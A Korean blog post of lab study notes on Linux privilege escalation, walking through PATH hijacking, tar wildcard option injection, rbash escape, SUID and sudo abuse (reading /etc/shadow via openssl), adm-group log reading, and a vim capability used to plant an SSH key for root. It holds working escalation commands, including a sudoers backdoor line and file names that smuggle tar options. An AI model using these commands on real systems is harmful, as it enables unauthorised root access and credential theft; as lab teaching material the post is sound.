---
title: "Linux Privilege Escalation - Environment and Permissions"
date: 2026-06-07
layout: single
excerpt: "Linux 환경에서 PATH Abuse, Wildcard Abuse, 제한 셸 우회와 같은 환경 기반 권한 상승 기법을 살펴보고, SUID·SGID, 잘못 설정된 sudo 권한, 특권 그룹 및 Linux Capabilities를 이용한 권한 상승 과정을 실습한다."
author_profile: true
toc: true
toc_label: "Linux Privilege Escalation"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [linux, cpts, priv-esc, suid, sudo, capabilities]
---

Linux 환경에서 PATH Abuse, Wildcard Abuse, 제한 셸 우회와 같은 환경 기반 권한 상승 기법을 살펴보고, SUID, SGID, 잘못 설정된 sudo 권한, 특권 그룹 및 Linux Capabilities를 이용한 권한 상승 과정을 실습한다.

---

# Environment-based Privilege Escalation

## Path Abuse

우선 리눅스 권한 상승 기법 중 하나로 환경 변수인 `$PATH` 를 악용하는 방법이 존재한다.

예를 들어 다음과 같다:

```bash
htb-student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/tmp
```

셸은 $PATH에 등록된 디렉터리를 왼쪽부터 순서대로 탐색하며, 명령어와 일치하는 실행 파일을 처음 발견한 경로에서 실행한다.

예를 들어 다음과 같은 상황을 가정해 보자.

다음 스크립트를 root 권한으로 실행할 수 있도록 sudoers가 설정되어 있다고 가정한다:

```text
(root) NOPASSWD: /opt/scripts/check.sh
```

이 셸 스크립트 내부에는 다음과 같이 절대 경로가 지정되지 않은 명령어가 작성되어 있다:

```bash
#!/bin/bash

systeminfo
```

이때 sudoers에 `secure_path` 가 적용되지 않거나 사용자가 설정한 `$PATH` 가 유지되는 등, 아래와 같은 보호 설정이 제대로 적용되지 않은 상태라면 취약할 수 있다:

```text
env_reset
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

또한 현재 디렉터리에 파일을 생성할 수 있다고 가정하면, `$PATH` 의 가장 앞에 현재 디렉터리를 추가할 수 있다:

```bash
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

이처럼 현재 디렉터리를 가장 먼저 탐색하게 만든 뒤, `systeminfo` 라는 실행 파일을 생성하고 악성 스크립트를 삽입한다. 이후 허용된 sudo 스크립트를 실행하면 정상 명령어보다 현재 디렉터리의 `./systeminfo` 가 먼저 발견되어 root 권한으로 실행될 수 있다.

## Wildcard Abuse

와일드카드를 권한 상승에 악용할 수 있는 대표적인 예가 `tar` 명령어이다.

특히 `tar` 의 `--checkpoint-action` 옵션은 체크포인트에 도달했을 때 지정한 명령을 실행할 수 있게 해준다.

즉, `tar` 명령이 실행될 때 임의의 운영체제 명령어를 실행할 수 있다.

다음과 같은 이름의 파일을 생성해 두면:

```text
--checkpoint=1
--checkpoint-action=exec=sh root.sh
```

와일드카드 `*` 가 확장될 때 이 파일 이름들이 단순한 파일 이름이 아니라 `tar` 의 명령줄 옵션으로 전달될 수 있다.

다음 cron 작업은 `/home/htb-student` 디렉터리의 내용을 백업하고, 같은 디렉터리에 압축 파일을 생성하도록 설정되어 있다:

```text
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

여기서 cron 작업이 실행될 때 셸은 먼저 `*` 를 현재 디렉터리의 파일 이름 목록으로 확장한다.

이 점을 이용하면, 공격자는 `tar` 옵션처럼 보이는 이름의 파일을 생성할 수 있다.

먼저 root 권한으로 실행시키고 싶은 명령을 `root.sh` 파일에 작성한다:

```bash
htb_student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

이 명령은 `htb-student` 사용자가 비밀번호 없이 모든 명령을 root 권한으로 실행할 수 있도록 sudoers에 항목을 추가한다.

다음으로 tar 옵션처럼 생긴 파일을 생성한다:

```bash
htb_student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
```

이 파일 이름은 `tar` 에게 체크포인트에 도달하면 다음 명령을 실행하라는 옵션처럼 해석될 수 있다:

```text
sh root.sh
```

다음 파일도 생성한다:

```bash
htb_student@NIX02:~$ echo "" > --checkpoint=1
```

이 파일 이름은 `tar` 에게 1레코드마다 체크포인트를 생성하라는 옵션처럼 해석될 수 있다.

이후 cron 작업이 다시 실행되면, 원래 명령은 다음과 같다:

```bash
tar -zcf /home/htb-student/backup.tar.gz *
```

하지만 셸이 `*` 를 파일 이름으로 확장하면서 실제로는 개념상 다음과 비슷하게 실행된다:

```bash
tar -zcf /home/htb-student/backup.tar.gz --checkpoint=1 "--checkpoint-action=exec=sh root.sh" root.sh
```

그 결과 `/etc/sudoers` 에 다음 권한이 추가된다:

```text
htb-student ALL=(root) NOPASSWD: ALL
```

즉, 이제 사용자는 sudo를 통해 root 권한의 명령을 실행하거나 root 셸로 전환할 수 있다.

## Escaping Restricted Shells

서버 내부에서는 제한 셸인 `rbash` 가 적용되어 일부 명령어 실행이 불가능했다:

```bash
htb-user@ubuntu:~$ ls
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

현재 셸은 `rbash` 이며, 기본적으로 디렉터리 이동이나 `$PATH` 변경, `/` 가 포함된 명령 경로 지정 등이 제한된다.

`ls` 를 찾지 못한 셸이 `/usr/lib/command-not-found` 도우미를 실행하려 했지만, `rbash` 가 명령 경로에 `/` 가 포함되어 있다는 이유로 해당 도우미의 실행을 차단하면서 발생한 것이다.

```bash
htb-user@ubuntu:~$ echo "test"

test
```

`echo` 는 Bash 내장 명령어이므로 실행되었다.

추가 테스트 결과 `cat`, `id`, `ls` 와 같은 외부 명령어들은 실행되지 않았다.

따라서 외부 실행 파일을 호출하는 대신, 셸 내장 기능인 명령어 치환과 입력 리다이렉션을 이용하여 파일 내용을 읽는 방식이 가능하다.

이렇게 작성하였다:

```bash
htb-user@ubuntu:~$ echo `<flag.txt`
```

그 결과 아래처럼 플래그가 출력되었다:

```text
HTB{35c4p3_7h3_r3st...}
```

이는 백틱 내부의 `<flag.txt` 가 Bash의 파일 읽기 축약 형태로 처리되고, 그 결과가 명령어 치환을 통해 `echo` 의 인수로 전달되기 때문이다.

개념적으로 변환하면 다음과 같다:

```bash
htb-user@ubuntu:~$ echo HTB{35c4p3_7h3_r3st...}
```

---

# Permissions-based Privilege Escalation

## Special Permissions

Linux에는 `setuid` 와 `setgid` 특수 권한이 존재한다.

`setuid` 가 설정된 실행 파일은 파일 소유자의 권한으로, `setgid` 가 설정된 실행 파일은 파일 그룹의 권한으로 실행된다. 

파일 소유자나 그룹이 root인 경우 해당 권한으로 동작한다.

root가 소유한 SUID 파일을 찾기 위해 다음 명령어를 사용하였다:

```bash
htb-student@NIX02:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

이 명령은 root가 소유하고 SUID 비트(`4000`)가 설정된 항목을 찾아 `ls -ldb` 형식으로 출력한다.

다음과 같은 파일들이 존재하였다:

```bash
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31  2020 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Nov 29  2022 /bin/su
-rwsr-xr-x 1 root root 109000 Jan 30  2018 /bin/sed
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping

# SKIP
```

SUID와 SGID가 모두 설정된 root 소유 항목을 찾는 명령어도 존재한다:

```bash
htb-student@NIX02:~/shared_obj_hijack$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 130264 May 29  2023 /usr/lib/snapd/snap-confine
-rwsr-sr-x 1 root root 227520 Mar 19  2018 /usr/bin/facter
```

## Sudo Rights Abuse

또한 sudoers 설정에서 취약한 항목이 존재할 수 있다.

`sudo -l` 명령을 통해 현재 사용자에게 허용된 sudo 권한을 확인하였다:

```bash
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

이 출력은 현재 사용자가 비밀번호 없이 `/usr/bin/openssl` 을 root 권한으로 실행할 수 있다는 뜻이다.

권한 상승 가능성을 확인하기 위해 [GTFOBins](https://gtfobins.org/gtfobins/openssl/)의 OpenSSL 항목을 참고하였다.

GTFOBins에는 OpenSSL을 이용하여 현재 사용자에게 읽기 권한이 없는 파일을 읽는 방법이 정리되어 있었다.

따라서 이렇게 명령어를 작성하였다:

```bash
htb-student@NIX02:~$ sudo /usr/bin/openssl enc -in /etc/shadow
```

그 결과 정상적으로 파일이 출력되는 것을 확인할 수 있었다:

```text
root:$6$WanLJSRD$y.zGt2OxMWkO9K/aNaLzh48ugtuVFjMJp9AT8Q3CxEJNjGaGTarLU5Vs1aZIOGv.jyehUWE5Ue.rz/kYnxDQ2.:19744:0:99999:7:::
daemon:*:17590:0:99999:7:::
bin:*:17590:0:99999:7:::

# SKIP
```

## Privileged Groups

우선 `id` 명령을 통해 현재 사용자가 어떤 그룹에 속해 있는지 살펴보았다:

```bash
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

현재 사용자는 `secaudit` 이며, 소속 그룹 목록에 `adm` 그룹이 포함되어 있었다.

`adm` 그룹은 여러 시스템 로그를 읽을 수 있는 권한을 가진다.

따라서 읽을 수 있는 로그를 확인하였다:

```bash
secaudit@NIX02:~$ ls -l /var/log | grep adm

drwxr-x---  2 root   adm                4096 Jan 25  2024 apache2
-rw-r-----  1 root   adm                1661 Jan 22  2024 apport.log
-rw-r-----  1 syslog adm              377852 Aug  3 15:54 auth.log
-rw-r-----  1 syslog adm             2959202 Aug  3 15:21 kern.log
drwxr-x---  2 mysql  adm                4096 Jan 25  2024 mysql
-rw-r-----  1 syslog adm             4144725 Aug  3 15:54 syslog
drwxr-x---  2 root   adm                4096 Jan 25  2024 unattended-upgrades
```

이처럼 adm 그룹 권한으로 읽을 수 있는 로그 파일과 디렉터리를 확인할 수 있다.

따라서 이 권한을 활용하여 로그 내부의 flag 문자열을 검색하였다:

```bash
secaudit@NIX02:/var/log$ grep -RniE 'flag' . 2>/dev/null
```

그 결과 정상적으로 플래그가 확보되었다:

```text
./apache2/access.log:127:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_t[SKIP] HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
./apache2/access.log:128:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_t[SKIP] HTTP/1.1" 404 27847 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

## Capabilities

Linux capabilities는 특정 프로세스에 세분화된 권한을 부여하여 일반적으로 제한된 작업을 수행할 수 있도록 하는 Linux 보안 기능이다.

하지만 이 설정이 잘못되면 공격자에게 악용될 수 있다.

capabilitie 종류는 이러하다:

1. cap_sys_admin	     :  시스템 설정 변경, 파일시스템 마운트 등 다양한 관리자 작업을 수행할 수 있다.
2. cap_setuid	         :  프로세스가 자신의 사용자 ID를 변경할 수 있다. UID를 0으로 설정하면 root 권한을 얻는 데 악용될 수 있다.
3. cap_setgid	         :  프로세스가 자신의 그룹 ID를 변경할 수 있다.
4. cap_dac_override	     :  일반적인 파일 읽기, 쓰기, 실행 권한 검사를 우회할 수 있다.
5. cap_sys_chroot	     :  현재 프로세스의 루트 디렉터리를 변경할 수 있다.
6. cap_sys_ptrace	     :  다른 프로세스에 연결하거나 디버깅할 수 있어, 민감한 정보를 읽거나 프로세스 동작을 변경할 가능성이 있다.
7. cap_sys_nice	         :  프로세스의 우선순위를 변경할 수 있다.
8. cap_sys_time	         :  시스템 시간을 변경할 수 있다.
9. cap_sys_resource	     :  열린 파일 디스크립터 수나 메모리 제한 같은 시스템 자원 제한을 변경할 수 있다.
10. cap_sys_module	     :  커널 모듈을 로드하거나 제거할 수 있다.
11. cap_net_bind_service :	일반적으로 권한이 필요한 낮은 번호의 네트워크 포트에 바인딩할 수 있다.

이 중 권한 상승 관점에서 특히 위험한 Capability는 `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_sys_admin` 이다.

이러한 Capability가 잘못 설정되면 민감한 파일을 읽거나 수정하는 것은 물론, 권한 상승까지 가능해질 수 있다.

우선 시스템에 설정된 Capability를 열거하였다:

```bash
htb-student@ubuntu:~$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

그 결과 다음과 같이 출력되었다:

```bash
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip
```

이 중 `/usr/bin/vim.basic` 에 `cap_dac_override=eip` 가 적용되어 있었다.

이 Capability는 일반적인 DAC 파일 권한 검사를 우회할 수 있으며, `e`, `i`, `p` 집합이 설정되어 있다.

집합은 다음과 같다:

1. Effective (e)    : 현재 프로세스가 실제로 사용 중인 Capability
2. Permitted (p)    : 프로세스가 활성화할 수 있도록 허용된 Capability
3. Inheritable (i)  : 자식 프로세스 실행 시 상속에 사용될 수 있는 Capability

따라서 `/usr/bin/vim.basic` 을 실행하면 해당 Vim 프로세스가 `cap_dac_override` 를 사용하여 일반적인 파일 읽기, 쓰기, 실행 권한 검사를 우회할 수 있다.

이 기능을 이용하면 실습 환경에서는 root의 `.ssh/authorized_keys` 파일에 공개키를 추가한 뒤, 대응하는 개인키로 SSH에 접속할 수 있다.

우선 로컬 터미널에서 다음 명령어로 SSH 공개키와 개인키를 생성하였다:

```bash
$ ssh-keygen -t rsa -b 4096          

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase for "/home/kali/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:7e3986oa/nbcKiSlTfnYxIQokKDzwBvxERPkyyATWsI kali@kali
The key's randomart image is:
+---[RSA 4096]----+
|+ o.B+.o   . .   |
|.E = o. . . . .  |
|+ B o    .   +   |
| o O .   .  + o  |
|  . +   S .= =   |
|         .o.+ o  |
|          oo.. . |
|         . oo.o..|
|          o+++++=|
+----[SHA256]-----+
```

이후 공개키인 `id_rsa.pub` 파일의 내용을 복사하였다.

그 후 다음 명령어로 `/root/.ssh/authorized_keys` 파일을 열고, `id_rsa.pub` 의 내용을 추가한 뒤 저장하였다:

```bash
htb-student@ubuntu:~$ /usr/bin/vim.basic /root/.ssh/authorized_keys
```

```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCp7ctdbr++uTF0IZR4n76mPKZnkDcUchJyuv+Kw+89WS+BwtY/s4NXJeY8ybkMp7FLv1uz9QQ6WQrK5wi7+aYFXHjd/AvtAyNRAnE8/XEvBuFTx/xfI2ZezEQp7F/QdFfwnMcFteYasT4T/cKZeSsj9lZX/ZX4++iN7iJNhB5dU6JSgxDvd/ncFHXmud3T0a9DkgEwCDpfvNQPw0zAotksUkfjj68rrJPCgE8AmFba0QKuqbOa9DPwX6r6l0k7IspC+jT7v4gCsKwCpb1b3yI595o7/UkiRSumq79YdgwJ52qyapSVQbaztiCOtopYvUkIABbUU/2e+qXNhh/+8MVH0cQJEFBiL6STd/bacnXikSV0af2zCz81P4ETgDri1qd7D4j0l9te58RrN0M/MUXiVsXqImcL/V8yqBWehPuq2W5dI68fCZ/Z3GKYrzcsJS9l7XTSgtentJevbsEQwWqKUofSiXJslD/XQBc8Feq9NVzetdGhOadT4TOZVAYcAimlRhBb7I5pkzUshDkKzxNkIKbifXcrgLeKUoKD92Wx0APccLoO3iUaUajjPm6uOg4F+UOssJsYX6/6d28Tv+AK3B6iMWE64jN9RIzC0n0Afwecczd4f7xZtnIeHInXeN0NJ0QPZK1rCxGC1I1IwoV2NlJ4OVtOGO4qHvxcWUkXHQ== kali@kali

:wq!
```

그 후 SSH 로그인을 진행하여 정상적으로 root 계정에 접속하는 데 성공하였다:

```bash
$ ssh -i .ssh/id_rsa root@10.129.205.111

# SKIP

root@ubuntu:~#
```